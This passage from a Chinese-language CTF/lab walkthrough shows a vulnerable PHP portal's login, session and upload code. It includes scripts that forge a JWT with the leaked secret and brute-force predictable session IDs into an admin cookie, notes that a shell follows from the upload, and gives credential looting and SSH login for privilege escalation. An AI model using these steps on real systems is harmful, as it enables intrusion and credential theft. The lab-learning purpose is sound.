class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;db/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;cookie.php&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;vendor/autoload.php&quot;</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">Firebase</span>\<span class="title">JWT</span>\<span class="title">JWT</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$errors</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$userdata</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="variable">$valid</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="variable">$IP</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//if user clicks on login</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>] == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$query</span> = <span class="string">&quot;SELECT username,position FROM users WHERE username=? LIMIT 1&quot;</span>;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$query</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line">        <span class="keyword">while</span> (<span class="variable">$row</span> = <span class="variable">$result</span>-&gt;fetch_array(MYSQLI_ASSOC))&#123;</span><br><span class="line">            array_push(<span class="variable">$userdata</span>, <span class="variable">$row</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$userCount</span> = <span class="variable">$result</span>-&gt;num_rows;</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$userCount</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$password</span> = sha1(<span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$passwordQuery</span> = <span class="string">&quot;SELECT * FROM users WHERE password=? AND username=? LIMIT 1&quot;</span>;</span><br><span class="line">            <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$passwordQuery</span>);</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&#x27;ss&#x27;</span>, <span class="variable">$password</span>, <span class="variable">$username</span>);</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows &gt; <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="variable">$valid</span> = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$stmt</span>-&gt;close();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$valid</span>)&#123;</span><br><span class="line">            session_id(makesession(<span class="variable">$username</span>));</span><br><span class="line">            session_start();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$secret_key</span> = <span class="string">&#x27;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#x27;</span>;</span><br><span class="line">            <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">            <span class="variable">$payload</span> = <span class="keyword">array</span>(</span><br><span class="line">                <span class="string">&quot;data&quot;</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line">                    <span class="string">&quot;username&quot;</span> =&gt; <span class="variable">$username</span></span><br><span class="line">            ));</span><br><span class="line"></span><br><span class="line">            <span class="variable">$jwt</span> = JWT::encode(<span class="variable">$payload</span>, <span class="variable">$secret_key</span>, <span class="string">&#x27;HS256&#x27;</span>);</span><br><span class="line">            </span><br><span class="line">            setcookie(<span class="string">&quot;token&quot;</span>, <span class="variable">$jwt</span>, time() + (<span class="number">86400</span> * <span class="number">30</span>), <span class="string">&quot;/&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$userdata</span>[<span class="number">0</span>][<span class="string">&#x27;position&#x27;</span>] == <span class="string">&quot;&quot;</span>)&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="string">&quot;Awaiting approval&quot;</span>;</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;role&#x27;</span>] = <span class="variable">$userdata</span>[<span class="number">0</span>][<span class="string">&#x27;position&#x27;</span>];</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            header(<span class="string">&quot;Location: /portal&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;valid&#x27;</span>] = <span class="string">&quot;Username or Password incorrect&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">elseif</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;method&#x27;</span>] == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable">$passwordConf</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwordConf&#x27;</span>];</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$username</span>))&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;Username Required&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">4</span>)&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;Username must be at least 4 characters long&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;password&#x27;</span>] = <span class="string">&quot;Password Required&quot;</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span> !== <span class="variable">$passwordConf</span>)&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;passwordConf&#x27;</span>] = <span class="string">&quot;Passwords don&#x27;t match!&quot;</span>; </span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$userQuery</span> = <span class="string">&quot;SELECT * FROM users WHERE username=? LIMIT 1&quot;</span>;</span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$userQuery</span>);</span><br><span class="line">        <span class="variable">$stmt</span> -&gt;bind_param(<span class="string">&#x27;s&#x27;</span>,<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;get_result();</span><br><span class="line">        <span class="variable">$userCount</span> = <span class="variable">$result</span>-&gt;num_rows;</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;close();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$userCount</span> &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$errors</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&quot;Username already exists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(count(<span class="variable">$errors</span>) === <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$password</span> = sha1(<span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO users(username, password, age, position) VALUES (?,?, 0, &#x27;&#x27;)&quot;</span>;</span><br><span class="line">            <span class="variable">$stmt</span> = <span class="variable">$con</span>-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">            <span class="variable">$stmt</span> -&gt;bind_param(<span class="string">&#x27;ss&#x27;</span>, <span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$stmt</span>-&gt;execute())&#123;</span><br><span class="line">                <span class="variable">$user_id</span> = <span class="variable">$con</span>-&gt;insert_id;</span><br><span class="line">                header(<span class="string">&#x27;Location: login.php&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>] = <span class="literal">false</span>;</span><br><span class="line">                <span class="variable">$errors</span>[<span class="string">&#x27;db_error&#x27;</span>]=<span class="string">&quot;Database error: failed to register&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>/portal/cookie.php</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> string $username  Username requesting session cookie</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> string $session_cookie Returns the generated cookie</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * <span class="doctag">@devteam</span></span></span><br><span class="line"><span class="comment"> * Please DO NOT use default PHPSESSID; our security team says they are predictable.</span></span><br><span class="line"><span class="comment"> * CHANGE SECOND PART OF MD5 KEY EVERY WEEK</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">makesession</span>(<span class="params"><span class="variable">$username</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$max</span> = strlen(<span class="variable">$username</span>) - <span class="number">1</span>;</span><br><span class="line">    <span class="variable">$seed</span> = rand(<span class="number">0</span>, <span class="variable">$max</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="string">&quot;s4lTy_stR1nG_&quot;</span>.<span class="variable">$username</span>[<span class="variable">$seed</span>].<span class="string">&quot;(!528.\/9890&quot;</span>;</span><br><span class="line">    <span class="variable">$session_cookie</span> = <span class="variable">$username</span>.md5(<span class="variable">$key</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$session_cookie</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>/portal/includes/fileController.php</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ret</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;../vendor/autoload.php&quot;</span>;</span><br><span class="line"><span class="keyword">use</span> \<span class="title">Firebase</span>\<span class="title">JWT</span>\<span class="title">JWT</span>;</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$jwt</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$secret_key</span> = <span class="string">&#x27;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&#x27;</span>;</span><br><span class="line">    <span class="variable">$ret</span> = JWT::decode(<span class="variable">$jwt</span>, <span class="variable">$secret_key</span>, <span class="keyword">array</span>(<span class="string">&#x27;HS256&#x27;</span>));   </span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;REQUEST_METHOD&#x27;</span>] === <span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$admins</span> = <span class="keyword">array</span>(<span class="string">&quot;paul&quot;</span>);</span><br><span class="line">    <span class="variable">$user</span> = validate()-&gt;data-&gt;username;</span><br><span class="line">    <span class="keyword">if</span>(in_array(<span class="variable">$user</span>, <span class="variable">$admins</span>) &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&quot;paul&quot;</span>)&#123;</span><br><span class="line">        error_reporting(E_ALL &amp; ~E_NOTICE);</span><br><span class="line">        <span class="variable">$uploads_dir</span> = <span class="string">&#x27;../uploads&#x27;</span>;</span><br><span class="line">        <span class="variable">$tmp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;task&#x27;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$tmp_name</span>, <span class="string">&quot;<span class="subst">$uploads_dir</span>/<span class="subst">$name</span>&quot;</span>))&#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="string">&quot;Success. Have a great weekend!&quot;</span>;</span><br><span class="line">        &#125;     </span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$ret</span> = <span class="string">&quot;Missing file or title :(&quot;</span> ;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$ret</span> = <span class="string">&quot;Insufficient privileges. Contact admin or developer to upload code. Note: If you recently registered, please wait for one of our admins to approve it.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ret</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>/portal/php/files.php</code></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start();</span><br><span class="line"><span class="variable">$LOGGED_IN</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] !== <span class="string">&quot;paul&quot;</span>)&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ../index.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;loggedIn&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$LOGGED_IN</span> = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">require</span> <span class="string">&#x27;../db/db.php&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    header(<span class="string">&quot;Location: ../auth/login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>而且files.php存在一个上传功能<br />以理一下攻击链</p><ul><li>fileController.php上传文件</li><li>要求得到<code>paul</code>的身份</li><li>生成<code>PHPSESSID</code>和<code>JWT</code></li></ul><p>对于<code>JWT</code><br />我们已经得到了签名密钥</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">token_dict = &#123;<span class="string">&quot;data&quot;</span>:&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;paul&quot;</span>&#125;&#125;</span><br><span class="line">headers = &#123;<span class="string">&quot;typ&quot;</span>:<span class="string">&quot;JWT&quot;</span>, <span class="string">&quot;alg&quot;</span>:<span class="string">&quot;HS256&quot;</span>&#125;</span><br><span class="line">jwt_token = jwt.encode(token_dict, <span class="string">&quot;6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e&quot;</span>, algorithm=<span class="string">&quot;HS256&quot;</span>, headers=headers).decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">print(jwt_token)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI</span><br></pre></td></tr></table></figure><p>对于<code>PHPSESSID</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$num</span> = <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">    <span class="variable">$username</span> = <span class="string">&quot;paul&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$num</span> <span class="keyword">as</span> <span class="variable">$a</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="string">&quot;s4lTy_stR1nG_&quot;</span>.<span class="variable">$username</span>[<span class="variable">$a</span>].<span class="string">&quot;(!528./9890&quot;</span>;</span><br><span class="line">        <span class="variable">$session_cookie</span> = <span class="variable">$username</span>.md5(<span class="variable">$key</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$session_cookie</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">paula2a6a014d3bee04d7df8d5837d62e8c5</span><br><span class="line">paul61ff9d4aaefe6bdf45681678ba89ff9d</span><br><span class="line">paul8c8808867b53c49777fe5559164708c3</span><br><span class="line">paul47200b180ccd6835d25d034eeb6e6390</span><br></pre></td></tr></table></figure><p>最后得到的Cookie为</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.4mJguG8tRd2z_feWJpmr_J3AdMeDPvW7GCK7cW7o0AI; PHPSESSID=paul47200b180ccd6835d25d034eeb6e6390</span><br></pre></td></tr></table></figure><p>上传ZIP时修改文件名和文件内容即可GetShell</p><h2 id="权限提升-3"><a class="markdownIt-Anchor" href="#权限提升-3"></a> 权限提升</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\www-data\Desktop\xampp\htdocs\portal\pizzaDeliveryUserData\juliette.json</span><br></pre></td></tr></table></figure><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;pizza&quot;</span> : <span class="string">&quot;margherita&quot;</span>,</span><br><span class="line"><span class="attr">&quot;size&quot;</span> : <span class="string">&quot;large&quot;</span>,</span><br><span class="line"><span class="attr">&quot;drink&quot;</span> : <span class="string">&quot;water&quot;</span>,</span><br><span class="line"><span class="attr">&quot;card&quot;</span> : <span class="string">&quot;VISA&quot;</span>,</span><br><span class="line"><span class="attr">&quot;PIN&quot;</span> : <span class="string">&quot;9890&quot;</span>,</span><br><span class="line"><span class="attr">&quot;alternate&quot;</span> : &#123;</span><br><span class="line"><span class="attr">&quot;username&quot;</span> : <span class="string">&quot;juliette&quot;</span>,</span><br><span class="line"><span class="attr">&quot;password&quot;</span> : <span class="string">&quot;jUli901./())!&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用凭证<code>juliette:jUli901./())!</code>登入ssh服务</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> C:\Users\juliette\Desktop\user.txt</span><br><span class="line">c5d9d568c5fc21e0dc0c5819d16aad9f</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> C:\Users\juliette\Desktop\todo.html</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">html&#123;</span><br><span class="line">background:black;</span><br><span class="line">color:orange;</span><br><span class="line">&#125;</span><br><span class="line">table,th,td&#123;</span><br><span class="line">border:1px solid orange;</span><br><span class="line">padding:1em;</span><br><span class="line">border-collapse:collapse;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;table&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;th&gt;Task&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;Status&lt;/th&gt;</span><br><span class="line">            &lt;th&gt;Reason&lt;/th&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;Configure firewall <span class="keyword">for</span> port 22 and 445&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Not started&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Unauthorized access might be possible&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;Migrate passwords from the Microsoft Store Sticky Notes application to our new password manager&lt;/td&gt;   </span><br><span class="line">            &lt;td&gt;In progress&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;It stores passwords <span class="keyword">in</span> plain text&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">        &lt;tr&gt;</span><br><span class="line">            &lt;td&gt;Add new features to password manager&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;Not started&lt;/td&gt;</span><br><span class="line">            &lt;td&gt;To get promoted, hopefully lol&lt;/td&gt;</span><br><span class="line">        &lt;/tr&gt;</span><br><span class="line">&lt;/table&gt;</span><br><span class="line"></span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>寻找密码存储文件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dir C:\Users\juliette\Documents</span><br><span class="line"></span><br><span class="line">11/29/2020  04:10 AM             4,096 plum.sqlite</span><br><span class="line">01/15/2021  05:10 PM            32,768 plum.sqlite-shm</span><br><span class="line">01/15/2021  05:10 PM           329,632 